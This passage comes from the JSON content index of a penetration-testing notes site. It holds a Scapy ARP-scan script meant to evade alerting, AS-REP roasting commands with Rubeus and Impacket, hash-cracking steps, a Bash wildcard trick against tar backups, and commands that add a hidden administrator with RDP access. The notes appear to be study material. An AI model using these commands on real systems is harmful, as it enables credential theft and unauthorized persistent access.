python3&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Scans the given IP range on the given network using ARP&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# rather than ICMP to help bypass potential alerting.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; scapy&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;all &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;import&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; *&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;interface &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;eth0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ip_range &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;10.10.X.X/24&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;broadcastMac &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;ff:ff:ff:ff:ff:ff&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;packet &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; Ether&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;dst&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; broadcastMac&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; ARP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;pdst&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; ip_range&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ans&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; unans &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; srp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;packet&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; timeout&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; iface&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; interface&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; inter&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0.1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;for&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; send&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; receive &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;in&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; ans&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;:&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\tprint&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;receive&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;sprintf&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;r&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5E3F;--shiki-dark:#C4704F&quot;&gt;%Ether&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5E3F;--shiki-dark:#C4704F&quot;&gt;src% - %ARP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5E3F;--shiki-dark:#C4704F&quot;&gt;psrc%&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;))&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Note that the &lt;code&gt;r&lt;/code&gt; here isn’t a mistake — rather it specifies a &lt;a href=&quot;https://whatisanything.com/how-do-you-write-an-f-string-in-python/#What_does_R_mean_Python&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“raw string”&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (the use of which, incidentally, requires Python 3.6+).&lt;/p&gt;"},"spells/ARP":{"slug":"spells/ARP","filePath":"spells/ARP.md","title":"ARP","links":["spells/OSI-model","spells/MAC-address"],"tags":["Protocol/ARP","Standard/OSI","Hardware/MACAddress","Protocol/IPv4","Protocol/IPv6"],"content":"The ARP protocol links OSI layers 2 and 3 by mapping IP addresses to MAC addresses. ARP packet message headers contain two operation codes: REQUEST (1) and REPLY (2).\nBasically, an ARP request will broadcast “to” a particular IP address but using the “broadcast” MAC address (00:00:00:00:00:00), and the computer with that IP address will then reply in a non-broadcast fashion (since this requires that both the MAC address and IP address be filled in, such a direct reply provides the desired information by way of its very existence).\nBecause ARP requests are about binding a MAC address to an IP address, they are necessarily limited to the current subnet.","richContent":"&lt;p&gt;The ARP protocol links &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/OSI-model&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/OSI-model&quot;&gt;OSI&lt;/a&gt; layers 2 and 3 by mapping IP addresses to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/MAC-address&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MAC-address&quot;&gt;MAC addresses&lt;/a&gt;. ARP packet message headers contain two operation codes: REQUEST (1) and REPLY (2).&lt;/p&gt;\n&lt;p&gt;Basically, an ARP request will broadcast “to” a particular IP address but using the “broadcast” &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/MAC-address&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MAC-address&quot;&gt;MAC address&lt;/a&gt; (00:00:00:00:00:00), and the computer with that IP address will then reply in a non-broadcast fashion (since this requires that both the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/MAC-address&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MAC-address&quot;&gt;MAC address&lt;/a&gt; and IP address be filled in, such a direct reply provides the desired information by way of its very existence).&lt;/p&gt;\n&lt;p&gt;Because ARP requests are about binding a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/MAC-address&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MAC-address&quot;&gt;MAC address&lt;/a&gt; to an IP address, they are necessarily limited to the current subnet.&lt;/p&gt;"},"spells/AS-REP-roasting-With-Rubeus":{"slug":"spells/AS-REP-roasting-With-Rubeus","filePath":"spells/AS-REP roasting With Rubeus.md","title":"AS-REP roasting With Rubeus","links":["spells/Hashcat"],"tags":["OS/Windows/ActiveDirectory","AttackCycle/Exploitation/AS-REPRoasting","Application/Rubeus","Application/Hashcat"],"content":"# AS-REP roasting with Rubeus.\n#\nRubeus.exe asreproast\nTo use Hashcat to crack the hashes obtained in this fashion, first insert 23$ after the leading $kerb5asrep$ (so $kerb5asrep$ → $kerb5asrep$23$) and then use mode 18200.","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# AS-REP roasting with Rubeus.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Rubeus.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; asreproast&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;To use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Hashcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hashcat&quot;&gt;Hashcat&lt;/a&gt; to crack the hashes obtained in this fashion, first insert &lt;code&gt;23$&lt;/code&gt; after the leading &lt;code&gt;$kerb5asrep$&lt;/code&gt; (so &lt;code&gt;$kerb5asrep$&lt;/code&gt; → &lt;code&gt;$kerb5asrep$23$&lt;/code&gt;) and then use mode 18200.&lt;/p&gt;"},"spells/AS-REP-roasting-with-Impacket":{"slug":"spells/AS-REP-roasting-with-Impacket","filePath":"spells/AS-REP roasting with Impacket.md","title":"AS-REP roasting with Impacket","links":["spells/Impacket","spells/AS-REP-roasting"],"tags":["OS/Windows/ActiveDirectory","AttackCycle/Exploitation/AS-REPRoasting","Application/Impacket","Protocol/Kerberos"],"content":"Impacket (via GetNPUsers.py) support AS-REP roasting. However, GetNPUsers.py requires that user accounts already be enumerated and roastable accounts identified.\nWhen using GetNPUsers.py, specify the target as ${DOMAIN}/ (i.e., leave off the user-part).","richContent":"&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Impacket&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Impacket&quot;&gt;Impacket&lt;/a&gt; (via GetNPUsers.py) support &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/AS-REP-roasting&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/AS-REP-roasting&quot;&gt;AS-REP roasting&lt;/a&gt;. However, GetNPUsers.py requires that user accounts already be enumerated and roastable accounts identified.&lt;/p&gt;\n&lt;p&gt;When using GetNPUsers.py, specify the target as &lt;code&gt;${DOMAIN}/&lt;/code&gt; (i.e., leave off the user-part).&lt;/p&gt;"},"spells/AS-REP-roasting":{"slug":"spells/AS-REP-roasting","filePath":"spells/AS-REP roasting.md","title":"AS-REP roasting","links":["spells/Kerberoasting","spells/Kerberos","spells/NTLM-hashes","spells/AS-REP-roasting-with-Impacket","spells/AS-REP-roasting-With-Rubeus"],"tags":["Protocol/Kerberos","OS/Windows/ActiveDirectory","Cryptography/Hashes/NT","AttackCycle/Exploitation/AS-REPRoasting","AttackCycle/Exploitation/Kerberoasting"],"content":"AES-REP roasting is basically kerberoasting for regular user accounts. The only requirement to roast a user account is that Kerberos pre-authentication is disable.\n(When pre-authentication is disabled, the authentication server will supply a ticket granting ticket and a session key automatically when requested, without first verifying the user. This data is then stored offline by the Windows machine for later decryption when the user with pre-authentication disabled logs in. But this means that all we need to do is to break the user’s NT hash!)\nAS-REP Roasting Using Impacket\nTransclude of AS-REP-roasting-with-Impacket\nAS-REP Roasting Using Rubeus\nTransclude of AS-REP-roasting-With-Rubeus\nDefenses\nBasically the only mitigation for this attack is to keep pre-authentication enabled, though strong password policies can help.","richContent":"&lt;p&gt;AES-REP roasting is basically &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberoasting&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberoasting&quot;&gt;kerberoasting&lt;/a&gt; for regular user accounts. The only requirement to roast a user account is that &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; pre-authentication is disable.&lt;/p&gt;\n&lt;p&gt;(When pre-authentication is disabled, the authentication server will supply a ticket granting ticket and a session key automatically when requested, &lt;em&gt;without first verifying the user&lt;/em&gt;. This data is then stored offline by the Windows machine for later decryption when the user with pre-authentication disabled logs in. But this means that all we need to do is to break the user’s &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/NTLM-hashes&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/NTLM-hashes&quot;&gt;NT hash&lt;/a&gt;!)&lt;/p&gt;\n&lt;h2 id=&quot;as-rep-roasting-using-impacket&quot;&gt;AS-REP Roasting Using Impacket&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#as-rep-roasting-using-impacket&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;AS-REP-roasting-with-Impacket&quot; data-block=&quot;&quot; data-embed-alias=&quot;AS-REP roasting with Impacket&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/AS-REP-roasting-with-Impacket&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/AS-REP-roasting-with-Impacket&quot;&gt;Transclude of AS-REP-roasting-with-Impacket&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;as-rep-roasting-using-rubeus&quot;&gt;AS-REP Roasting Using Rubeus&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#as-rep-roasting-using-rubeus&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;AS-REP-roasting-With-Rubeus&quot; data-block=&quot;&quot; data-embed-alias=&quot;AS-REP roasting With Rubeus&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/AS-REP-roasting-With-Rubeus&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/AS-REP-roasting-With-Rubeus&quot;&gt;Transclude of AS-REP-roasting-With-Rubeus&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;defenses&quot;&gt;Defenses&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#defenses&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Basically the only mitigation for this attack is to keep pre-authentication enabled, though strong password policies can help.&lt;/p&gt;"},"spells/Abusing-wildcard-expansion-in-Bash":{"slug":"spells/Abusing-wildcard-expansion-in-Bash","filePath":"spells/Abusing wildcard expansion in Bash.md","title":"Abusing wildcard expansion in Bash","links":["spells/tar"],"tags":["Language/Bash","Application/tar","AttackCycle/Exploitation","OS/Linux"],"content":"The wildcard expansion (*) in Bash scripts doesn’t get pushed to the command, but is instead expanded in place. This means that files named like command-line switches will be interpreted as command line switches. This can be used, for example, to exploit sloppy tar-based backup scripts.","richContent":"&lt;p&gt;The wildcard expansion (&lt;code&gt;*&lt;/code&gt;) in Bash scripts doesn’t get pushed to the command, but is instead expanded in place. This means that files named like command-line switches &lt;em&gt;will be interpreted as command line switches&lt;/em&gt;. This can be used, for example, to exploit sloppy &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/tar&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/tar&quot;&gt;tar&lt;/a&gt;-based backup scripts.&lt;/p&gt;"},"spells/Access-the-Windows-Registry-using-PowerShell":{"slug":"spells/Access-the-Windows-Registry-using-PowerShell","filePath":"spells/Access the Windows Registry using PowerShell.md","title":"Access the Windows Registry using PowerShell","links":[],"tags":["HowTo","OS/Windows/Registry","Application/PowerShell"],"content":"You can actually access the registry from PowerShell using the cd command: cd HKLM:\\ will take you to the HKEY_LOCAL_MACHINE hive, for instance.\nMajor hives:\n\nHKEY_CLASSES_ROOT\nHKEY_CURRENT_USER\nHKEY_LOCAL_MACHINE\nHKEY_USERS\nHKEY_CURRENT_CONFIG\n","richContent":"&lt;p&gt;You can actually access the registry from PowerShell using the cd command: &lt;code&gt;cd HKLM:\\&lt;/code&gt; will take you to the &lt;code&gt;HKEY_LOCAL_MACHINE&lt;/code&gt; hive, for instance.&lt;/p&gt;\n&lt;p&gt;Major hives:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;HKEY_CLASSES_ROOT&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;HKEY_USERS&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;HKEY_CURRENT_CONFIG&lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;"},"spells/Add-Windows-users-at-the-command-line":{"slug":"spells/Add-Windows-users-at-the-command-line","filePath":"spells/Add Windows users at the command line.md","title":"Add Windows users at the command line","links":[],"tags":["OS/Windows","Application/net","OS/Windows/Registry","Application/reg"],"content":"net user $USERNAME $PASSWORD /add\nnet localgroup Administrators $USER /add\nnet localgroup &quot;Remote Desktop Users&quot; $USER /add\nreg add `\n    &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; `\n    /v fDenyTSConnections /t REG_DWORD /d 0 /f\nThis requires SYSTEM privileges or a (local) administrator account.\nIt’s worth noting that users added via net user seem to bypass Windows’ password policies…","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;net user &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;USERNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;PASSWORD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;add&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;net localgroup Administrators &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;add&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;net localgroup &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Remote Desktop Users&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; $&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;USER&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;add&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;reg add &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;    &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;    /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;v 